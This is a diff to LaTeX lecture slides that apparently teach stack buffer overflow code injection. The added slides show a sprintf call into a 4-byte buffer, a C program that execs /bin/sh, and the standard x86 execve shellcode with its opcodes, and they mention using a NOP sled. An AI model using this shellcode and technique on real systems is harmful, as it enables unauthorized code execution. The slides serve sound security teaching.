@@ -344,15 +344,113 @@ int main()
 \begin{center}
 \includegraphics[scale=0.35]{stackff9.png}
 \end{center}
+\end{frame}
 
+
+\begin{frame}[fragile]
+  \frametitle{Code Injection}
+\begin{lstlisting}
+void func(char *arg1)
+{
+   char buffer[4];
+   sprintf(buffer, arg1);
+   ...
+}
+\end{lstlisting}
+
+\begin{center}
+\includegraphics[scale=0.35]{stackff10.png}
+\end{center}
+\end{frame}
+
+
+\begin{frame}
+  \frametitle{Inject Code}
+Loading Code:
+\\
+\begin{itemize}
+	\item Machine code
+	\item Can't contain all-zero bytes
+	\item Can't use loader 
+\end{itemize}
+
+What should we inject?
+\\
+\begin{itemize}
+\item
+\textcolor{red}{general-purpose shell!}
+\end{itemize}
 \end{frame}
 
 \begin{frame}[fragile]
   \frametitle{Code Injection}
+\begin{lstlisting}
+#include <stdio.h>
+int main()
+{
+    char *name[2];
+    name[0] = "/bin/sh";
+    name[1] = NULL;
+    execv(name[0], name, NULL);
+}
+\end{lstlisting}
+\end{frame}
+
+
+\begin{frame}[fragile]
+  \frametitle{Code Injection}
+
+\begin{lstlisting}
+00000000        31C0              xor eax,eax
+00000002        50                push eax
+00000003        682F2F7368        push dword 0x68732f2f
+00000008        682F62696E        push dword 0x6e69622f
+0000000D        89E3              mov ebx,esp
+0000000F        50                push eax
+00000010        53                push ebx
+00000011        89E1              mov ecx,esp
+00000013        99                cdq
+00000014        B00B              mov al,0xb
+00000016        CD80              int 0x80
+\end{lstlisting}
+
+\end{frame}
+
+
+\begin{frame}
+  \frametitle{Inject Code}
+Running Code:
+\\
+\begin{itemize}
+	\item We can not use: jump into my code instruction
+	\item We do not know where exactly our code is?
+\end{itemize}
+\begin{center}
+\includegraphics[scale=0.35]{stackff11.png}
+\end{center}
+
+\end{frame}
+
+
+
+\begin{frame}
+  \frametitle{Inject Code}
+Find our code address:
+\\
+\begin{itemize}
+	\item Guess it?! 
+	\item use $nop$
+\end{itemize}
+\begin{center}
+\includegraphics[scale=0.35]{stackff12.png}
+\end{center}
 
 \end{frame}
 
 \begin{frame}
   \frametitle{Questions}
+  \begin{center}
+  Questions?
+  \end{center}
 \end{frame}
 \end{document}
